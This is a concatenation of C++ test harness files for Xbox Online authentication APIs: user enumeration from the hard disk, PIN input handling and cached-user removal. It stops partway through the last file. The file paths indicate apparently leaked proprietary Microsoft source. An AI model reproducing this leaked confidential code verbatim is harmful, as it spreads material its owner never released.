=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetUsersFromHD\XOnlineGetUsersFromHD.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetUsersFromHD.cpp
 *  Content:    XOnlineGetUsersFromHD tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineGetUsersFromHD
 *
 ****************************************************************************/

#include "XOnlineGetUsersFromHD.h"
#include <XOnlineAuthUtil.h>

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global list of drives
 *
 ****************************************************************************/

static const CHAR DRIVES[] = { 
	0, 
	'F', 
	'G', 
	'H', 
	'I', 
	'J', 
	'K', 
	'L', 
	'M' 
};

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 *  XOnlineGetUsersFromHD_VALID_DRIVE_VALID_USER_VALID_COUNT 
 *
	Description:
		Go through each mountable drive (MU and hard disk), 
		and retrieve each user profile. Do this for every 
		possible number of users per device

	Input: 
		chDrive: 'a' thru 'z'
		pUsers: valid pointer
		pcUsers: valid pointer

	System State:
		Users exist on drive: TRUE
		Users on drive valid: TRUE 
		Number of users on drive: 0 thru MAX_STORED_USERS
		MU at drive exists: TRUE

	Verify: 
		Return value is S_OK
		Count of users is correct
		user data is valid

 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetUsersFromHD_VALID_DRIVE_VALID_USER_VALID_COUNT ( void )
{
    HRESULT             hr              = S_OK;
	DWORD				dwNumUsers		= 0;

	XONLINEP_USER aUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_USER users[XONLINE_MAX_STORED_ONLINE_USERS];

	//
	// cycle through each drive
	//

	for ( DWORD i = 0; i < NUMELEMS( DRIVES ) && SUCCEEDED( hr ); i++ )
	{

		//
		// cycle through N users
		//

		for ( DWORD j = 0; j <= XONLINE_MAX_STORED_ONLINE_USERS && SUCCEEDED( hr ); j++ )
		{

			//
			// zero out the users
			//

			ZeroMemory( aUsers, sizeof( aUsers ) );

			//
			// remove all users on the drive
			//

			CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( aUsers, j ) );

			//
			// if this drive is not mounted, then goto next drive
			//

			if ( 0x80070002 == hr )
			{
				hr = S_OK;
				break;
			}

			//
			// Get the users on the drive
			//

			CHECKRUN( XOnlineGetUsers( users, &dwNumUsers ) );
		
			//
			// check to make sure there is only j user
			//

			if ( SUCCEEDED( hr ) )
			{
				hr = j == dwNumUsers ? S_OK : E_FAIL;
			}
		}
	}

    //
    // Return the Hresult
    //

    return hr;
}


/****************************************************************************
 *
 *  XOnlineGetUsersFromHD_NULL_DRIVE_VALID_USER_VALID_COUNT
 *
	Description:
		Make sure API will fail correctly when a bogus drive value is passed in

	Input: 
		chDrive: '\255'
		pUsers: valid pointer
		pcUsers: valid pointer

	System State:
		Users exist on drive: N/A
		Users on drive valid: N/A
		Number of users on drive: N/A
		MU at drive exists: FALSE

	Verify: 
		Return value is not S_OK

 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetUsersFromHD_NULL_DRIVE_VALID_USER_VALID_COUNT( void )
{
    HRESULT             hr              = S_OK;
	DWORD				dwNumUsers		= 0;
	XONLINE_USER aUsers[XONLINE_MAX_STORED_ONLINE_USERS];

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetUsersFromHD_VALID_DRIVE_VALID_USER_NULL_COUNT
 *
	Description:
		Make sure API will fail correctly when a NULL user pointer is passed in

	Input: 
		chDrive: 'c'
		pUsers: valid pointer
		pcUsers: NULL

	System State:
		Users exist on drive: TRUE
		Users on drive valid: TRUE
		Number of users on drive: 1
		MU at drive exists: TRUE

	Verify: 
			Return value is not S_OK

 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetUsersFromHD_VALID_DRIVE_VALID_USER_NULL_COUNT( void )
{
    HRESULT             hr              = S_OK;

	XONLINE_USER aUsers[XONLINE_MAX_STORED_ONLINE_USERS];

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// call add cached user with junk
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineGetUsers( aUsers, NULL ), E_INVALIDARG ) );

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetUsersFromHD_VALID_DRIVE_NULL_USER_VALID_COUNT
 *
	Description:
		Make sure API will fail correctly when a NULL user pointer is passed in

	Input: 
		chDrive: 'c'
		pUsers: NULL
		pcUsers: valid pointer

	System State:
		Users exist on drive: TRUE
		Users on drive valid: TRUE
		Number of users on drive: 1
		MU at drive exists: TRUE

	Verify: 
			Return value is not S_OK

 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetUsersFromHD_VALID_DRIVE_NULL_USER_VALID_COUNT( void )
{
    HRESULT             hr              = S_OK;
	DWORD				dwNumUsers		= 0;

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// call add cached user with junk
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineGetUsers( NULL, &dwNumUsers ), E_INVALIDARG ) );

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetUsersFromHD_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineGetUsersFromHD tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetUsersFromHD_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

	CHECKRUN( StartNetwork() );

    //
    // Test XOnlineGetUsersFromHD with a valid drive, a valid user and a valid count
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineGetUsers", "VALID_DRIVE_VALID_USER_VALID_COUNT" );
    EXECUTE( XOnlineGetUsersFromHD_VALID_DRIVE_VALID_USER_VALID_COUNT() );

    //
    // Test XOnlineGetUsersFromHD with a NULL drive, a valid user and a valid count
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineGetUsers", "NULL_DRIVE_VALID_USER_VALID_COUNT" );
    EXECUTE( XOnlineGetUsersFromHD_NULL_DRIVE_VALID_USER_VALID_COUNT() );

    //
    // Test XOnlineGetUsersFromHD with a NULL drive, a valid user and a valid count
    //
#if 0       // Remove pending fix for RAID #10575
    SETLOG( LogHandle, "danrose", "Online", "XOnlineGetUsers", "VALID_DRIVE_VALID_USER_NULL_COUNT" );
    EXECUTE( XOnlineGetUsersFromHD_VALID_DRIVE_VALID_USER_NULL_COUNT() );

    //
    // Test XOnlineGetUsersFromHD with a NULL drive, a valid user and a valid count
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineGetUsers", "VALID_DRIVE_NULL_USER_VALID_COUNT" );
    EXECUTE( XOnlineGetUsersFromHD_VALID_DRIVE_NULL_USER_VALID_COUNT() );
#endif
	CHECKRUN( CloseNetwork() );
}

/****************************************************************************
 *
 *  XOnlineGetUsersFromHD_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetUsersFromHD_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineGetUsersFromHD_StartTest( NULL );
    XOnlineGetUsersFromHD_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineGetUsersFromHD )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineGetUsersFromHD )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineGetUsersFromHD_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineGetUsersFromHD_EndTest )
END_EXPORT_TABLE( XOnlineGetUsersFromHD )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlinePINDecodeInput\XOnlinePINDecodeInput.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlinePINDecodeInput.h
 *  Content:    XOnlinePINDecodeInput utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/24/01    danrose Created to test Xbox XOnlinePINDecodeInput
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xonline.h>
#include <xlog.h>
#include <macros.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlinePINStartInput\XOnlinePINStartInput.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlinePINStartInput.h
 *  Content:    XOnlinePINStartInput utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/24/01    danrose Created to test Xbox XOnlinePINStartInput
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xonline.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlinePINEndInput\XOnlinePINEndInput.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlinePINEndInput.h
 *  Content:    XOnlinePINEndInput utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/24/01    danrose Created to test Xbox XOnlinePINEndInput
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonline.h>
#include <macros.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlinePINEndInput\XOnlinePINEndInput.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlinePINEndInput.cpp
 *  Content:    XOnlinePINEndInput tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/24/01    danrose Created to test Xbox XOnlinePINEndInput
 *
 ****************************************************************************/

#include <XOnlineAuthUtil.h>
#include "XOnlinePINEndInput.h"

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 *  XOnlinePINEndInput_ValidInputHandle
 *
 *	Description:
 *		End pin input with a valid input handle
 *
 *	Input: 
 *		Handle: a valid handle
 *
 *	System State:
 *		None
 *
 *	Verify: 
 *		Return value is S_OK
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINEndInput_ValidInputHandle( void )
{
    HRESULT             hr              = S_OK;
	XPININPUTHANDLE		inputHandle		= NULL;
	XINPUT_STATE		inputState;

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// Start PIN Input 
	//

	CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( &inputState ) );

	//
	// End PIN Input
	//

	RUN( XOnlinePINEndInput( inputHandle ) );
    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINEndInput_NullInputHandle
 *
 *	Description:
 *		End pin input with a NULL input handle
 *
 *	Input: 
 *		Handle: NULL
 *
 *	System State:
 *		None
 * 
 *	Verify: 
 *		Return value is not S_OK
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINEndInput_NullInputHandle( void )
{
    HRESULT             hr              = S_OK;

	//
	// set up returns instead of asserts
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// call PIN END INPUT with a null arg
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlinePINEndInput( NULL ), E_INVALIDARG ) );

	//
	// reset val
	//

	g_ParamCheckReturnsError = FALSE;

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINEndInput_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlinePINEndInput tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlinePINEndInput_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

	CHECKRUN( StartNetwork() );

    //
    // Test XOnlinePINEndInput with a valid input handle
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINEndInput", "ValidInputHandle" );
    EXECUTE( XOnlinePINEndInput_ValidInputHandle() );

    //
    // Test XOnlinePINEndInput with a valid input handle
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINEndInput", "NullInputHandle" );
    EXECUTE( XOnlinePINEndInput_NullInputHandle() );

	CHECKRUN( CloseNetwork() );
}

/****************************************************************************
 *
 *  XOnlinePINEndInput_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlinePINEndInput_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlinePINEndInput_StartTest( NULL );
    XOnlinePINEndInput_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlinePINEndInput )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlinePINEndInput )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlinePINEndInput_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlinePINEndInput_EndTest )
END_EXPORT_TABLE( XOnlinePINEndInput )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineRemoveCachedUser\XOnlineRemoveCachedUser.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineRemoveCachedUser.cpp
 *  Content:    XOnlineRemoveCachedUser tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineRemoveCachedUser
 *
 ****************************************************************************/

#include "XOnlineRemoveCachedUser.h"
#include <XOnlineAuthUtil.h>

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 *  XOnlineRemoveCachedUser_VALID_DRIVE_VALID_USER_EXISTS
 *
 *	Description:
 *		Go through each mountable drive (MU and hard disk), 
 *		and try to remove the 1 user that exists on that drive
 *
 *	Input: 
 *		chDrive: 'a' thru 'z' 
 *		pUser: valid user
 *
 *	System State:
 *		User exists on drive: TRUE
 *		User on drive valid: TRUE
 *		Number of users on drive: 1
 *		MU at drive exists: TRUE
 *
 *	Verify: 
 *		Return value is S_OK
 *		User on drive does not exist
 *		0 user on drive
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineRemoveCachedUser_BASIC_TEST( void )
{
    HRESULT             hr              = S_OK;
    DWORD				dwNumUsers		= 0;
    
    XONLINEP_USER aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_USER aVerifyUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    
    ZeroMemory( aIniUsers, sizeof( aIniUsers ) );
    ZeroMemory( aVerifyUsers, sizeof( aVerifyUsers ) );
    
    // Generate a list of users in memory.
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( aIniUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
    CHECKRUN( XOnlineGetUsers( (PXONLINE_USER)aIniUsers, &dwNumUsers ) );
    if (SUCCEEDED(hr))
    {
        hr = (dwNumUsers == XONLINE_MAX_HD_ONLINE_USERS + CountMUAccounts((PXONLINE_USER) aIniUsers)) ? S_OK : E_FAIL;
    }
    
    // Delete 1 user until there are none.
    for ( DWORD i = 0; i < XONLINE_MAX_HD_ONLINE_USERS + CountMUAccounts((PXONLINE_USER) aIniUsers) && SUCCEEDED( hr ); i++ )
    {
        // Only delete HD accounts.
        if (IsHDAccount((XONLINE_USER const *) aIniUsers + i))
        {
            // Delete 1 user from the HD.
            CHECKRUN( _XOnlineRemoveUserFromHD( (PXONLINE_USER)( aIniUsers + i ) ) );
            ZeroMemory(aIniUsers + i, sizeof(XONLINEP_USER));
        }
    }
    
    //
    // check to make sure there are the correct number of user accounts
    //    
    // Get all user accounts.
    CHECKRUN( XOnlineGetUsers( aVerifyUsers, &dwNumUsers ) );
    if ( SUCCEEDED( hr ) )
    {
        // Verify that only MU accounts remain.
        hr = (dwNumUsers == CountMUAccounts(aVerifyUsers)) ? S_OK : E_FAIL;
    }

    return hr;
}

/****************************************************************************
 *
 *  XOnlineRemoveCachedUser_UNDERFLOW_TEST 
 *
 *	Description:
 *		Go through each mountable drive (MU and hard disk), 
 *		and try to remove a user when there are no users on the drive
 *
 *	Input: 
 *		chDrive: 'a' thru 'z' 
 *		pUser: valid user
 *
 *	System State:
 *		User exists on drive: FALSE
 *		User on drive valid: N/A
 *		Number of users on drive: 0
 *		MU at drive exists: TRUE
 *
 *	Verify: 
 *		Return value is not S_OK
 *		User on drive does not exist
 *		0 users on drive
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineRemoveCachedUser_UNDERFLOW_TEST ( void )
{
    HRESULT             hr              = S_OK;
	DWORD				dwNumUsers		= 0;

	XONLINE_USER aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
	XONLINE_USER aVerifyUsers[XONLINE_MAX_STORED_ONLINE_USERS];

	ZeroMemory( aIniUsers, sizeof( aIniUsers ) );

	// populate the list of users
	CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aIniUsers, XONLINE_MAX_HD_ONLINE_USERS ) );

    // Change the userID to non-existant one.
    aIniUsers[0].xuid.qwUserID ^= (ULONGLONG) 0xba5eba11baadf00d;

    if (SUCCEEDED(hr))
    {
        hr = _XOnlineRemoveUserFromHD( aIniUsers );
        hr = (SUCCEEDED(hr)) ? E_FAIL : S_OK;
    }

    return hr;
}

/****************************************************************************
 *
 *  XOnlineRemoveCachedUser_NULL_USER
 *
 *	Description:
 *		Make sure API fails with NULL user pointer
 *
 *	Input: 
 *		chDrive: XONLINE_LOCAL_HARD_DRIVE
 *		pUser: NULL
 *
 *	System State:
 *		User exists on drive: N/A
 *		User on drive valid: N/A
 *		Number of users on drive: N/A
 *		MU at drive exists: N/A
 *
 *	Verify: 
 *		Return value is not S_OK
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineRemoveCachedUser_NULL_USER( void )
{
    HRESULT             hr              = S_OK;

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	CHECKRUN( SUCCEED_ON_FAIL( _XOnlineRemoveUserFromHD( NULL ), E_INVALIDARG ) );

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    return hr;
}

/****************************************************************************
 *
 *  XOnlineRemoveCachedUser_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineRemoveCachedUser tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineRemoveCachedUser_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

	CHECKRUN( StartNetwork() );

    //
    // Test XOnlineRemoveCachedUser with valid drives and valid users exist
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineRemoveCachedUser", "BASIC_TEST" );
    EXECUTE( XOnlineRemoveCachedUser_BASIC_TEST() );

    if (!BVTMode())
    {
        //
        // Test XOnlineRemoveCachedUser with no users on HD
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineRemoveCachedUser", "UNDERFLOW_TEST" );
        EXECUTE( XOnlineRemoveCachedUser_UNDERFLOW_TEST() );
        
        //
        // Test XOnlineRemoveCachedUser with NULL user
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineRemoveCachedUser", "NULL_USER" );
        EXECUTE( XOnlineRemoveCachedUser_NULL_USER() );
    }

	CHECKRUN( CloseNetwork() );
}

/****************************************************************************
 *
 *  XOnlineRemoveCachedUser_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineRemoveCachedUser_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineRemoveCachedUser_StartTest( NULL );
    XOnlineRemoveCachedUser_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineRemoveCachedUser )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineRemoveCachedUser )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineRemoveCachedUser_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineRemoveCachedUser_EndTest )
END_EXPORT_TABLE( XOnlineRemoveCachedUser )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineStartup\XOnlineStartup.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineStartup.h
 *  Content:    XOnlineStartup utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *   1/14/01    davidhef Created to test Xbox XOnlineStartup
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xtestlib.h>
#include <XOnlineAuthUtil.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlinePINStartInput\XOnlinePINStartInput.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlinePINStartInput.cpp
 *  Content:    XOnlinePINStartInput tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/24/01    danrose Created to test Xbox XOnlinePINStartInput
 *
 ****************************************************************************/

#include <XOnlineAuthUtil.h>
#include "XOnlinePINStartInput.h"
#include <list>
using namespace std;

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 *  XOnlinePINStartInput_ValidInputState
 *
 *	Description:
 *		Start pin input with a valid input state pointer
 *
 *	Input: 
 *		pInputState: valid pointer
 *
 *	System State:
 *		None
 *
 *	Verify: 
 *		Return value is not NULL
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINStartInput_ValidInputState( void )
{
    HRESULT             hr              = S_OK;
	XPININPUTHANDLE		inputHandle		= NULL;
	XINPUT_STATE		inputState;

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// Start PIN Input 
	//

	CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( &inputState ) );

	//
	// End PIN Input
	//

	RUN( XOnlinePINEndInput( inputHandle ) );

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINStartInput_ValidInputStateMultiple
 *
 *	Description:
 * 		Start pin input multiple times with valid input state pointers
 *
 *	Input: 
 *		pInputState: valid pointer
 *
 *	System State:
 *		None
 *
 *	Verify: 
 *		Return value is NULL on final call
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINStartInput_ValidInputStateMultiple( void )
{
    HRESULT             hr              = S_OK;
	XPININPUTHANDLE		inputHandle		= (XPININPUTHANDLE) INVALID_HANDLE_VALUE;
	XINPUT_STATE		inputState;

	//
	// keep a list of handles
	//

	list<XPININPUTHANDLE> inputHandles;

	//
	// Zero out the input state
	//
	
	ZeroMemory( &inputState, sizeof( XINPUT_STATE ) );

	//
	// cycle through calls to XOnlinePINStartInput
	//

	while ( NULL != inputHandle && SUCCEEDED( hr ) )
	{
		CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( &inputState ) );

		//
		// the above check will set hr to E_FAIL if NULL IS SEEN
		//

		if ( SUCCEEDED( hr ) )
		{
			try 
			{
				inputHandles.push_back( inputHandle );
			} 
			catch ( ... )
			{
				// NO CODE HERE
			}
		}

		//
		// reset hr
		//

		else
		{
			hr = S_OK;
		}
	}

	//
	// reset the input handle
	//

	inputHandle = (XPININPUTHANDLE) INVALID_HANDLE_VALUE;

	//
	// close each handle until the list is empty
	//

	while ( NULL != inputHandle && ! inputHandles.empty() )
	{
		//
		// get the front handle, and pop it off
		//

		inputHandle = inputHandles.front();
		inputHandles.pop_front();
		
		//
		// make sure the handle is not NULL
		//

		if ( NULL != inputHandle )
		{
			RUN( XOnlinePINEndInput( inputHandle ) );
		}
	}

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINStartInput_NullInputState
 *
 *	Description:
 *		Start pin input with a null input state pointer
 *
 *	Input: 
 *		PInputState: NULL
 *
 *	System State:
 *		None
 *
 *	Verify: 
 *		Return value is NULL
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlinePINStartInput_NullInputState( void )
{
    HRESULT             hr              = S_OK;
	XPININPUTHANDLE		inputHandle		= NULL;

	//
	// Set param checking as returning values
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// Start PIN Input 
	//

	CHECKRUNHANDLE( inputHandle, XOnlinePINStartInput( NULL ) );
	if ( NULL == inputHandle )
	{
		hr = S_OK;
	}

	//
	// reset the state of param checking
	//

	g_ParamCheckReturnsError = FALSE;

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlinePINStartInput_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlinePINStartInput tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlinePINStartInput_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

	CHECKRUN( StartNetwork() );

#ifdef CODE_COVERAGE

    //
    // Test XOnlinePINStartInput with multiple input states
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINStartInput", "ValidInputStateMultiple" );
    EXECUTE( XOnlinePINStartInput_ValidInputStateMultiple() );

#endif // CODE_COVERAGE

    //
    // Test XOnlinePINStartInput with a NULL Input State
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlinePINStartInput", "NullInputState" );
